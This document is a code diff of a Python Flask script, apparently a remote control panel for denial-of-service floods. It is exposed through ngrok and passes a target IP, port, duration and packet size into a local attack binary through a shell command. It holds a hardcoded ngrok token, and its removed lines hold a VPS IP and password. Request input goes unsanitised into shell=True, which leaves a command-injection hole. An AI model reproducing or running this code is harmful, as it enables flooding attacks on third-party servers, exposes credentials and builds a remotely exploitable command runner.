@@ -1,14 +1,14 @@
-import time
 import os
 import subprocess
 import threading
-import time
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory, g
 from pyngrok import ngrok
-import paramiko
+import time
+
+active_processes = {}
 
 def install_packages():
-    required_packages = ['Flask', 'pyngrok', 'paramiko']
+    required_packages = ['Flask', 'pyngrok']
     for package in required_packages:
         try:
             subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
@@ -20,56 +20,39 @@ def install_packages():
                 print(f"Failed to install {package}.")
 
 def configure_ngrok():
-    ngrok_token = "2mcFqfxL6WjGgOXrzRh8UDihKlN_4bTSFYt7FfpHqZ6GncGJW"
-    while True:
-        try:
-            ngrok.set_auth_token(ngrok_token)
-            print("ngrok token configured successfully.")
-            public_url_obj = ngrok.connect(5000)
-            public_url = public_url_obj.public_url
-            print(f"Public URL: {public_url}")
-            return public_url
-        except Exception as e:
-            if "ERR_NGROK_108" in str(e):
-                print("ngrok token is already in use or limited. Retrying in 30 seconds...")
-                time.sleep(30)
-            else:
-                print(f"Failed to configure ngrok: {str(e)}")
-                break
+    ngrok_token =  "2mcFqfxL6WjGgOXrzRh8UDihKlN_4bTSFYt7FfpHqZ6GncGJW"
+    try:
+        ngrok.set_auth_token(ngrok_token)
+        print("ngrok token configured successfully.")
+    except Exception as e:
+        print(f"Failed to configure ngrok: {str(e)}")
 
 def update_soul_txt(public_url):
-    with open("soms.txt", "w") as file:
+    with open("binder1.txt", "w") as file:
         file.write(public_url)
     print(f"New ngrok link saved in binder1.txt")
 
-def update_vps_soul_txt(public_url):
-    vps_ip = "16.170.254.242"
-    vps_user = "ubuntu"
-    vps_password = "13579780"
-
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(vps_ip, username=vps_user, password=vps_password)
-        sftp = ssh.open_sftp()
-        with sftp.open("soms.txt", "w") as file:
-            file.write(public_url)
-        sftp.close()
-        ssh.close()
-        print("Updated binder1.txt on VPS successfully.")
-    except Exception as e:
-        print(f"Failed to update soul3.txt on VPS: {str(e)}")
-
 def execute_command_async(command, duration):
-    def run():
+    def run(command_id):
         try:
-            result = subprocess.run(command, shell=True, text=True, capture_output=True)
-            print(f"Command executed: {command}")
-            print(f"Output: {result.stdout}")
+            process = subprocess.Popen(command, shell=True)
+            active_processes[command_id] = process.pid
+            print(f"Command executed: {command} with PID: {process.pid}")
+
+            time.sleep(duration)
+
+            if process.pid in active_processes.values():
+                process.terminate()
+                process.wait()
+                del active_processes[command_id]
+                print(f"Process {process.pid} terminated after {duration} seconds.")
+            g.result = {"status": "Command executed", "pid": process.pid}
         except Exception as e:
             print(f"Error executing command: {str(e)}")
+            g.result = {"status": "Error executing command", "error": str(e)}
 
-    thread = threading.Thread(target=run)
+    command_id = f"cmd_{len(active_processes) + 1}"
+    thread = threading.Thread(target=run, args=(command_id,))
     thread.start()
     return {"status": "Command execution started", "duration": duration}
 
@@ -81,11 +64,11 @@ def run_flask_app():
         return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')
 
     try:
-        public_url = configure_ngrok()
+        public_url_obj = ngrok.connect(5002)
+        public_url = public_url_obj.public_url
+        print(f"Public URL: {public_url}")
 
-        if public_url:
-            update_soul_txt(public_url)
-            update_vps_soul_txt(public_url)
+        update_soul_txt(public_url)
     except KeyboardInterrupt:
         print("ngrok process was interrupted.")
     except Exception as e:
@@ -95,18 +78,24 @@ def run_flask_app():
     def bgmi():
         ip = request.args.get('ip')
         port = request.args.get('port')
-        time = request.args.get('time')
+        duration = request.args.get('time')
+        packet_size = request.args.get('packet_size')
+        thread = request.args.get('thread')
 
-        if not ip or not port or not time:
+        if not ip or not port or not duration or not packet_size or not thread:
             return jsonify({'error': 'Missing parameters'}), 400
 
-        command = f"./2112 {ip} {port} {time}"
-        response = execute_command_async(command, time)
+        command = f"./2111 {ip} {port} {duration} {packet_size} 900"
+
+        # Start the command execution asynchronously
+        response = execute_command_async(command, int(duration))
         return jsonify(response)
 
     print("Starting Flask server...")
-    app.run(host='0.0.0.0', port=5001)
+    app.run(host='0.0.0.0', port=5002)
 
 if __name__ == "__main__":
     install_packages()
+    configure_ngrok()
     run_flask_app()
+    
